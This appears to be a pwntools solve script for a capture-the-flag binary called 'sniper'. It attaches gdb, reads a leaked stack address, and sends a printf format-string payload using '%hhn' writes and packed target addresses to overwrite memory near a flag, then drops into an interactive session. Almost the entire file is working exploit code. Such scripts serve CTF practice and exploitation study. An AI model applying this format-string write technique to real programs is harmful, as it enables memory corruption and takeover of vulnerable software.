from pwn import *


binary = './sniper'

p = process(binary)
s = '''
b * printf
b * vuln+103
'''

gdb.attach(p, s)


rdi = p.recvline().strip().decode()
rdi = int(rdi, 16)

print(hex(rdi))
flag_addr = 0xa0a0000

flag_stack_pos = rdi + 24
 # Value without \xa0
payload = b"%160c%9$hhn"
payload = b"%160c%10$hhn------------"      # Then use %n to modify it
payload += p64(0x9f9f0000) 
payload += p64(flag_stack_pos+2)
payload += p64(flag_stack_pos+3)


p.sendline(payload)

p.interactive()
